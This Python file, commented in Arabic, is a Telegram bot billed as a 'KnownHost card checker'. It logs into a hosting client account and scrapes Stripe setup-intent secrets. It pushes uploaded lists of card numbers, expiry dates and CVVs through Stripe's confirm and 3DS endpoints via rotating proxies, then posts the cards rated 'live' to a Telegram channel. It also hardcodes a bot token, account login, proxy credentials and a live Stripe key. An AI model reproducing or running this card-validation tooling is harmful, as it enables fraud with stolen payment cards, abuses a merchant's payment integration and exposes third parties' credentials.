import os
import asyncio
import threading
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
from bs4 import BeautifulSoup
import json
import random
import string
import time
import re

# ========== الإعدادات ==========
BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
ADMIN_IDS = [5895491379, 844663875]
CHANNEL_ID = -1003154179190

# 🔥 بيانات تسجيل الدخول الصحيحة
USERNAME = "mafj92368"
PASSWORD = "mafj92368@outlook.com"
LOGIN_URL = "https://my.knownhost.com/client/login"
AUTH_COOKIES_FILE = "auth_cookies.json"

# 🔥 قائمة البروكسيات
PROXY_LIST = [
    "82.26.221.169:5510:bxnvwevk:utgavp02z833",
    "82.29.225.10:5865:bxnvwevk:utgavp02z833",
    "82.22.220.181:5536:bxnvwevk:utgavp02z833",
    "82.21.224.74:6430:bxnvwevk:utgavp02z833",
    "82.29.230.232:7073:bxnvwevk:utgavp02z833",
    "82.25.216.145:6987:bxnvwevk:utgavp02z833",
    "82.25.216.194:7036:bxnvwevk:utgavp02z833",
    "82.27.214.60:6402:bxnvwevk:utgavp02z833",
    "82.24.224.197:5553:bxnvwevk:utgavp02z833",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
}

# ========== إحصائيات ==========
stats = {
    'total': 0,
    'checking': 0,
    'approved': 0,
    'rejected': 0,
    'secure_3d': 0,
    'auth_attempted': 0,
    'errors': 0,
    'start_time': None,
    'is_running': False,
    'dashboard_message_id': None,
    'chat_id': None,
    'current_card': '',
    'error_details': {},
    'last_response': 'Waiting...',
    'cards_checked': 0,
    'approved_cards': [],
    '3ds_cards': [],
    'auth_cards': [],
}

# ========== دالات البروكسي ==========
def get_random_proxy():
    """اختيار بروكسي عشوائي من القائمة"""
    proxy_line = random.choice(PROXY_LIST)
    parts = proxy_line.split(':')
    
    if len(parts) == 4:
        ip, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{ip}:{port}"
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        return proxies
    return None

# ========== دالات تحديث الكوكيز ==========
def get_csrf_and_cookies(session, proxies=None):
    """استخراج CSRF Token"""
    try:
        r = session.get(LOGIN_URL, headers=HEADERS, proxies=proxies, timeout=20)
        r.raise_for_status()
        soup = BeautifulSoup(r.text, "html.parser")
        token_input = soup.find("input", {"name": "_csrf_token"})
        csrf_token = token_input["value"] if token_input and token_input.has_attr("value") else None
        return csrf_token
    except Exception as e:
        print(f"[!] Error getting CSRF: {e}")
        return None

def login_and_get_cookies():
    """تسجيل الدخول وجلب كل الكوكيز"""
    try:
        proxies = get_random_proxy()
        proxy_display = list(proxies.values())[0].split('@')[1] if proxies else 'None'
        print(f"[🌐] Using proxy for login: {proxy_display}")
        
        with requests.Session() as s:
            csrf_token = get_csrf_and_cookies(s, proxies)
            if not csrf_token:
                print("[!] فشل في الحصول على CSRF Token")
                return None
            
            print(f"[✓] تم استخراج CSRF Token")
            
            data = {
                "_csrf_token": csrf_token,
                "username": USERNAME,
                "password": PASSWORD,
                "remember_me": "true",
            }
            
            post_headers = HEADERS.copy()
            post_headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://my.knownhost.com",
                "Referer": LOGIN_URL,
            })
            
            r = s.post(LOGIN_URL, headers=post_headers, data=data, proxies=proxies, allow_redirects=True, timeout=20)
            
            all_cookies = s.cookies.get_dict()
            
            if all_cookies and len(all_cookies) > 0:
                with open(AUTH_COOKIES_FILE, "w") as f:
                    json.dump(all_cookies, f, indent=2)
                print(f"[✓] تم حفظ {len(all_cookies)} كوكيز")
                return all_cookies
            else:
                print("[!] لم يتم العثور على كوكيز")
                return None
    except Exception as e:
        print(f"[!] خطأ في تسجيل الدخول: {e}")
        return None

def load_auth_cookies():
    """تحميل الكوكيز المحفوظة"""
    try:
        if os.path.exists(AUTH_COOKIES_FILE):
            with open(AUTH_COOKIES_FILE, "r") as f:
                cookies = json.load(f)
            print(f"[✓] تم تحميل {len(cookies)} كوكيز محفوظة")
            return cookies
        else:
            print("[!] ملف الكوكيز غير موجود، سيتم تسجيل الدخول...")
            return login_and_get_cookies()
    except Exception as e:
        print(f"[!] خطأ في تحميل الكوكيز: {e}")
        return login_and_get_cookies()

def refresh_cookies_if_needed():
    """تحديث الكوكيز"""
    print("[🔄] جاري تجديد الكوكيز...")
    auth_cookies = login_and_get_cookies()
    if auth_cookies:
        print("[✅] تم تجديد الكوكيز بنجاح!")
        return auth_cookies
    print("[❌] فشل تجديد الكوكيز")
    return None

# ========== دالات مساعدة ==========
def generate_random_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_guid():
    return f"{generate_random_string(8)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(12)}"

def create_fresh_session(auth_cookies):
    """إنشاء Session جديدة بالكوكيز الصحيحة"""
    session = requests.Session()
    
    if auth_cookies:
        session.cookies.update(auth_cookies)
    
    muid = f"{generate_guid()}{generate_random_string(6)}"
    sid = f"{generate_guid()}{generate_random_string(6)}"
    guid = f"{generate_guid()}{generate_random_string(6)}"
    stripe_js_id = generate_guid()
    
    session.cookies.set('__stripe_mid', muid)
    session.cookies.set('__stripe_sid', sid)
    
    return session, muid, sid, guid, stripe_js_id

def get_payment_page(session, proxies=None):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    
    try:
        response = session.get('https://my.knownhost.com/client/accounts/add/cc/', headers=headers, proxies=proxies, timeout=30)
        
        setup_secret = None
        patterns = [
            r"'(seti_[A-Za-z0-9]+_secret_[A-Za-z0-9]+)'",
            r'"(seti_[A-Za-z0-9]+_secret_[A-Za-z0-9]+)"',
            r'setupIntent["\']?\s*[:=]\s*["\']?(seti_[A-Za-z0-9]+_secret_[A-Za-z0-9]+)',
            r'(seti_[A-Za-z0-9]+_secret_[A-Za-z0-9]+)',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                setup_secret = match.group(1)
                break
        
        csrf_token = None
        csrf_match = re.search(r'_csrf_token"\s+value="([^"]+)"', response.text)
        if csrf_match:
            csrf_token = csrf_match.group(1)
        
        return csrf_token, setup_secret
    except Exception as e:
        print(f"[!] خطأ في get_payment_page: {e}")
        return None, None

# ========== إرسال النتائج للقناة ==========
async def send_to_channel(bot_app, card, status_type, message):
    """إرسال نتيجة مباشرة للقناة"""
    try:
        card_number = stats['approved'] + stats['auth_attempted'] + stats['secure_3d']
        
        if status_type == 'APPROVED':
            text = (
                "╔═══════════════════╗\n"
                "✅ **APPROVED CARD LIVE** ✅\n"
                "╚═══════════════════╝\n\n"
                f"💳 `{card}`\n"
                f"🔥 Status: **Approved**\n"
                f"📊 Card #{card_number}\n"
                f"⚡️ Mahmoud Saad\n"
                "╚═══════════════════╝"
            )
            stats['approved_cards'].append(card)
            
        elif status_type == 'AUTH_ATTEMPTED':
            text = (
                "╔═══════════════════╗\n"
                "🔄 **AUTH ATTEMPTED CARD** 🔄\n"
                "╚═══════════════════╝\n\n"
                f"💳 `{card}`\n"
                f"🔥 Status: **Auth Attempted**\n"
                f"📊 Card #{card_number}\n"
                f"⚡️ Mahmoud Saad\n"
                "╚═══════════════════╝"
            )
            stats['auth_cards'].append(card)
            
        else:  # 3D_SECURE
            text = (
                "╔═══════════════════╗\n"
                "⚠️ **3D SECURE CARD** ⚠️\n"
                "╚═══════════════════╝\n\n"
                f"💳 `{card}`\n"
                f"🔥 Status: **3D Secure**\n"
                f"📊 Card #{card_number}\n"
                f"⚡️ Mahmoud Saad\n"
                "╚═══════════════════╝"
            )
            stats['3ds_cards'].append(card)
        
        await bot_app.bot.send_message(
            chat_id=CHANNEL_ID,
            text=text,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"[!] خطأ في إرسال رسالة للقناة: {e}")

# ========== فحص البطاقة ==========
async def check_card(card, bot_app, auth_cookies):
    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        stats['checking'] -= 1
        await update_dashboard(bot_app)
        return card, "ERROR", "صيغة خاطئة"
    
    card_number, exp_month, exp_year, cvv = parts
    
    # 🔥 اختيار بروكسي عشوائي
    proxies = get_random_proxy()
    
    session, muid, sid, guid, stripe_js_id = create_fresh_session(auth_cookies)
    csrf_token, setup_secret = get_payment_page(session, proxies)
    
    if not setup_secret:
        print(f"[!] Setup Secret failed for card: {card_number[:6]}****{card_number[-4:]}")
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = 'Setup Error'
        await update_dashboard(bot_app)
        session.close()
        return card, "ERROR", "فشل Setup"
    
    print(f"[✓] Setup Secret OK for: {card_number[:6]}****{card_number[-4:]}")
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    
    time_on_page = random.randint(300000, 600000)
    setup_intent_id = setup_secret.split('_secret_')[0]
    
    # 🔥 نفس الـ data اللي في السكربت التجريبي
    confirm_data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=+&payment_method_data[billing_details][address][city]=&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=&payment_method_data[billing_details][address][state]=AL&payment_method_data[card][number]={card_number}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F0366a8cf46%3B+stripe-js-v3%2F0366a8cf46%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fmy.knownhost.com&payment_method_data[time_on_page]={time_on_page}&payment_method_data[client_attribution_metadata][client_session_id]={stripe_js_id}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn&client_attribution_metadata[client_session_id]={stripe_js_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_secret={setup_secret}'
    
    try:
        print(f"[📡] Confirming setup intent...")
        response = session.post(
            f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm',
            headers=headers,
            data=confirm_data,
            proxies=proxies,
            timeout=30
        )
        
        print(f"[✓] Stripe Response Code: {response.status_code}")
        result = response.json()
        
        # 🔥 حفظ الـ Response للفحص
        response_file = f"bot_response_{card_number[:6]}.json"
        with open(response_file, "w") as f:
            json.dump(result, f, indent=2)
        print(f"[💾] Response saved to: {response_file}")
        
        if 'error' in result:
            error_msg = result['error'].get('message', 'Unknown')
            error_code = result['error'].get('code', 'Unknown')
            print(f"[❌] Stripe Error: {error_code} - {error_msg}")
            stats['errors'] += 1
            stats['checking'] -= 1
            stats['last_response'] = f'Error: {error_code}'
            await update_dashboard(bot_app)
            session.close()
            return card, "ERROR", error_msg
        
        # طباعة الـ keys الموجودة في Response
        print(f"[📊] Response keys: {list(result.keys())}")
        
        if 'next_action' in result:
            print(f"[✓] Has next_action - proceeding to 3DS...")
            source = result['next_action']['use_stripe_sdk']['three_d_secure_2_source']
            
            auth_data = f'source={source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F141.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn'
            
            print(f"[📡] Sending 3DS authentication...")
            auth_response = session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=auth_data, proxies=proxies, timeout=30)
            print(f"[✓] 3DS Response Code: {auth_response.status_code}")
            
            auth_result = auth_response.json()
            
            # 🔥 حفظ الـ 3DS Response
            auth_file = f"bot_3ds_{card_number[:6]}.json"
            with open(auth_file, "w") as f:
                json.dump(auth_result, f, indent=2)
            print(f"[💾] 3DS Response saved to: {auth_file}")
            
            print(f"[📊] 3DS Response keys: {list(auth_result.keys())}")
            
            trans_status = auth_result.get('ares', {}).get('transStatus', 'Unknown')
            print(f"[🎯] Transaction Status: {trans_status}")
            
            if trans_status == 'N':
                stats['approved'] += 1
                stats['checking'] -= 1
                stats['last_response'] = 'N - Approved ✅'
                await update_dashboard(bot_app)
                await send_to_channel(bot_app, card, "APPROVED", "Approved")
                session.close()
                return card, "APPROVED", "Approved"
            elif trans_status == 'R':
                stats['rejected'] += 1
                stats['checking'] -= 1
                stats['last_response'] = 'R - Declined ❌'
                await update_dashboard(bot_app)
                session.close()
                return card, "REJECTED", "Declined"
            elif trans_status == 'C':
                stats['secure_3d'] += 1
                stats['checking'] -= 1
                stats['last_response'] = 'C - 3D Secure ⚠️'
                await update_dashboard(bot_app)
                await send_to_channel(bot_app, card, "3D_SECURE", "3DS")
                session.close()
                return card, "3D_SECURE", "3DS"
            elif trans_status == 'A':
                stats['auth_attempted'] += 1
                stats['checking'] -= 1
                stats['last_response'] = 'A - Auth Attempted 🔄'
                await update_dashboard(bot_app)
                await send_to_channel(bot_app, card, "AUTH_ATTEMPTED", "Auth Attempted")
                session.close()
                return card, "AUTH_ATTEMPTED", "Auth Attempted"
            else:
                print(f"[⚠️] Unknown status: {trans_status}")
                print(f"[📄] Full 3DS response: {json.dumps(auth_result, indent=2)}")
                
                # 🔥 إرسال Debug info للأدمن
                debug_text = (
                    f"⚠️ **DEBUG - Unknown Status**\n\n"
                    f"💳 Card: `{card_number[:6]}****{card_number[-4:]}`\n"
                    f"🎯 Status: `{trans_status}`\n\n"
                    f"📄 **3DS Response:**\n```json\n{json.dumps(auth_result, indent=2)[:3000]}\n```"
                )
                
                try:
                    await bot_app.bot.send_message(
                        chat_id=stats['chat_id'],  # للأدمن مش القناة
                        text=debug_text,
                        parse_mode='Markdown'
                    )
                except:
                    pass
                
                stats['errors'] += 1
                stats['checking'] -= 1
                stats['last_response'] = f'Unknown: {trans_status}'
                await update_dashboard(bot_app)
                session.close()
                return card, "UNKNOWN", trans_status
        else:
            print(f"[⚠️] No next_action in response")
            print(f"[📄] Full response: {json.dumps(result, indent=2)}")
            
            # 🔥 إرسال Debug info للأدمن
            debug_text = (
                f"⚠️ **DEBUG - No 3DS Action**\n\n"
                f"💳 Card: `{card_number[:6]}****{card_number[-4:]}`\n\n"
                f"📄 **Stripe Response:**\n```json\n{json.dumps(result, indent=2)[:3000]}\n```"
            )
            
            try:
                await bot_app.bot.send_message(
                    chat_id=stats['chat_id'],
                    text=debug_text,
                    parse_mode='Markdown'
                )
            except:
                pass
            
            stats['errors'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'No 3DS Action'
            await update_dashboard(bot_app)
            session.close()
            return card, "ERROR", "No 3DS"
            
    except Exception as e:
        print(f"[❌] Exception: {str(e)}")
        import traceback
        traceback.print_exc()
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = f'Error: {str(e)[:20]}'
        await update_dashboard(bot_app)
        session.close()
        return card, "EXCEPTION", str(e)

# ========== Dashboard ==========
def create_dashboard_keyboard():
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="approved"),
            InlineKeyboardButton(f"❌ Rejected: {stats['rejected']}", callback_data="rejected")
        ],
        [
            InlineKeyboardButton(f"⚠️ 3D Secure: {stats['secure_3d']}", callback_data="3ds"),
            InlineKeyboardButton(f"🔄 Auth: {stats['auth_attempted']}", callback_data="auth")
        ],
        [
            InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
        ],
        [
            InlineKeyboardButton(f"📡 Response: {stats['last_response']}", callback_data="response")
        ]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
    
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app):
    """تحديث Dashboard في القناة"""
    if stats['dashboard_message_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=CHANNEL_ID,
                message_id=stats['dashboard_message_id'],
                text="📊 **KNOWNHOST CARD CHECKER - LIVE** 📊",
                reply_markup=create_dashboard_keyboard(),
                parse_mode='Markdown'
            )
        except:
            pass

# ========== إنشاء الملفات النهائية ==========
async def send_final_files(bot_app):
    """إرسال ملفات txt للبطاقات المقبولة"""
    try:
        if stats['approved_cards']:
            approved_text = "\n".join(stats['approved_cards'])
            with open("approved_cards.txt", "w") as f:
                f.write(approved_text)
            await bot_app.bot.send_document(
                chat_id=CHANNEL_ID,
                document=open("approved_cards.txt", "rb"),
                caption=f"✅ **Approved Cards** ({len(stats['approved_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("approved_cards.txt")
        
        if stats['3ds_cards']:
            secure_text = "\n".join(stats['3ds_cards'])
            with open("3ds_cards.txt", "w") as f:
                f.write(secure_text)
            await bot_app.bot.send_document(
                chat_id=CHANNEL_ID,
                document=open("3ds_cards.txt", "rb"),
                caption=f"⚠️ **3D Secure Cards** ({len(stats['3ds_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("3ds_cards.txt")
        
        if stats['auth_cards']:
            auth_text = "\n".join(stats['auth_cards'])
            with open("auth_cards.txt", "w") as f:
                f.write(auth_text)
            await bot_app.bot.send_document(
                chat_id=CHANNEL_ID,
                document=open("auth_cards.txt", "rb"),
                caption=f"🔄 **Auth Attempted Cards** ({len(stats['auth_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("auth_cards.txt")
        
    except Exception as e:
        print(f"[!] خطأ في إرسال الملفات: {e}")

# ========== معالجات البوت ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return
    
    keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
    await update.message.reply_text(
        "📊 **KNOWNHOST CARD CHECKER BOT**\n\n"
        "أرسل ملف .txt يحتوي على البطاقات\n"
        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
        f"📢 القناة: `{CHANNEL_ID}`\n"
        f"🌐 Proxies: {len(PROXY_LIST)} active",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح")
        return
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ يوجد فحص جاري!")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    stats.update({
        'total': len(cards),
        'checking': 0,
        'approved': 0,
        'rejected': 0,
        'secure_3d': 0,
        'auth_attempted': 0,
        'errors': 0,
        'current_card': '',
        'error_details': {},
        'last_response': 'Starting...',
        'cards_checked': 0,
        'approved_cards': [],
        '3ds_cards': [],
        'auth_cards': [],
        'start_time': datetime.now(),
        'is_running': True,
        'chat_id': update.effective_chat.id
    })
    
    dashboard_msg = await context.application.bot.send_message(
        chat_id=CHANNEL_ID,
        text="📊 **KNOWNHOST CARD CHECKER - LIVE** 📊",
        reply_markup=create_dashboard_keyboard(),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    await update.message.reply_text(
        f"✅ تم بدء الفحص!\n\n"
        f"📊 إجمالي البطاقات: {len(cards)}\n"
        f"🌐 Using {len(PROXY_LIST)} proxies\n"
        f"📢 تابع النتائج في القناة",
        parse_mode='Markdown'
    )
    
    def run_checker():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(process_cards(cards, context.application))
        loop.close()
    
    threading.Thread(target=run_checker, daemon=True).start()

async def process_cards(cards, bot_app):
    """معالجة البطاقات"""
    # تحميل الكوكيز
    auth_cookies = load_auth_cookies()
    
    for i, card in enumerate(cards):
        if not stats['is_running']:
            break
        
        # تجديد الكوكيز كل 50 بطاقة
        if stats['cards_checked'] > 0 and stats['cards_checked'] % 50 == 0:
            print(f"[🔄] تم فحص {stats['cards_checked']} بطاقة، جاري تجديد الكوكيز...")
            new_cookies = refresh_cookies_if_needed()
            if new_cookies:
                auth_cookies = new_cookies
                stats['last_response'] = f'🔄 Cookies Refreshed'
                await update_dashboard(bot_app)
        
        stats['checking'] = 1
        parts = card.split('|')
        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
        await update_dashboard(bot_app)
        
        await check_card(card, bot_app, auth_cookies)
        stats['cards_checked'] += 1
        
        if stats['cards_checked'] % 5 == 0:
            await update_dashboard(bot_app)
        
        await asyncio.sleep(1)
    
    # انتهى الفحص
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app)
    
    # إرسال ملخص نهائي
    summary_text = (
        "═══════════════════\n"
        "✅ **اكتمل الفحص!** ✅\n"
        "═══════════════════\n\n"
        f"📊 **الإحصائيات النهائية:**\n"
        f"🔥 الإجمالي: {stats['total']}\n"
        f"✅ Approved: {stats['approved']}\n"
        f"❌ Rejected: {stats['rejected']}\n"
        f"⚠️ 3D Secure: {stats['secure_3d']}\n"
        f"🔄 Auth Attempted: {stats['auth_attempted']}\n"
        f"⚠️ Errors: {stats['errors']}\n\n"
        "📁 **جاري إرسال الملفات...**"
    )
    
    await bot_app.bot.send_message(
        chat_id=CHANNEL_ID,
        text=summary_text,
        parse_mode='Markdown'
    )
    
    # إرسال الملفات النهائية
    await send_final_files(bot_app)
    
    # رسالة نهائية
    final_text = (
        "╔═══════════════════╗\n"
        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
        "╚═══════════════════╝\n\n"
        "✅ تم إرسال جميع الملفات\n"
        "📊 شكراً لاستخدامك البوت!\n\n"
        "⚡️ Mahmoud Saad"
    )
    
    await bot_app.bot.send_message(
        chat_id=CHANNEL_ID,
        text=final_text,
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """التعامل مع أي رسالة نصية"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ غير مصرح", show_alert=True)
        return
    
    await query.answer()
    
    if query.data == "stop_check":
        stats['is_running'] = False
        await update_dashboard(context.application)
        await query.message.reply_text("🛑 تم إيقاف الفحص!")

def main():
    # تحميل الكوكيز عند البدء
    auth_cookies = load_auth_cookies()
    if auth_cookies:
        print("[✅] تم تحميل الكوكيز بنجاح!")
    else:
        print("[⚠️] تحذير: لم يتم تحميل الكوكيز")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("🤖 البوت يعمل...")
    print(f"📢 القناة: {CHANNEL_ID}")
    print(f"🌐 Proxies: {len(PROXY_LIST)} active")
    app.run_polling()

if __name__ == "__main__":
    main()
